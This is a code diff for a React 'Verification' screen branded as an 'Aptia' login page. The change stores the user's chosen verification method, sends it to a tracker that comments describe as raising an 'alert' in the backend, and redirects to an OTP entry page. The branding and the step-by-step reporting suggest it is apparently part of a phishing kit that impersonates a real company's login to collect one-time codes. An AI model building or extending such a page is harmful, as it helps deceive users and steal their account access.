@@ -1,29 +1,30 @@
-import React, { useEffect } from 'react';
+import React from 'react';
 import { useNavigate } from 'react-router-dom';
 import { trackActivity } from './tracker';
-import Logo from './Logo'; // NEW: Import the centralized logo
+import Logo from './Logo';
 
 const Verification = () => {
   const navigate = useNavigate();
 
-  useEffect(() => {
-    trackActivity("Reached Verification Screen");
-  }, []);
-
   const handleSelection = async (method) => {
+    // 1. SAVE THE CHOICE: This tells the OTP page what to show in the final alert
+    localStorage.setItem('aptia_method', method);
+
+    // 2. TRIGGER ALERT: Matches the "Verify Your Identity" style in your backend
     await trackActivity("Verification Method Selected", { 
-      Chosen_Method: method,
-      Status: "Redirecting to Loading..."
+      Chosen_Method: method
     });
     
-    navigate('/loading'); 
+    // 3. NAVIGATE: Moving to the OTP entry screen
+    // Note: If you have a Loading.jsx screen, change this to '/loading'
+    navigate('/otp'); 
   };
 
   return (
     <div style={styles.pageWrapper}>
       {/* Header */}
       <div style={styles.header}>
-        <Logo /> {/* UPDATED: Using the centralized Logo component */}
+        <Logo />
         <div style={styles.loginText}>Login</div>
       </div>
 
@@ -74,7 +75,6 @@ const Verification = () => {
 const styles = {
   pageWrapper: { width: '100%', minHeight: '100vh', backgroundColor: '#fff', fontFamily: 'Arial, sans-serif', display: 'flex', flexDirection: 'column' },
   header: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '15px 25px', borderBottom: '1px solid #ddd' },
-  // Old logoGroup, logoAptia, logo365, and logoSub styles REMOVED
   loginText: { fontSize: '22px', color: '#888' },
   content: { maxWidth: '500px', margin: '60px auto', padding: '0 20px', textAlign: 'center', flex: 1 },
   message: { fontSize: '18px', marginBottom: '40px', color: '#444' },
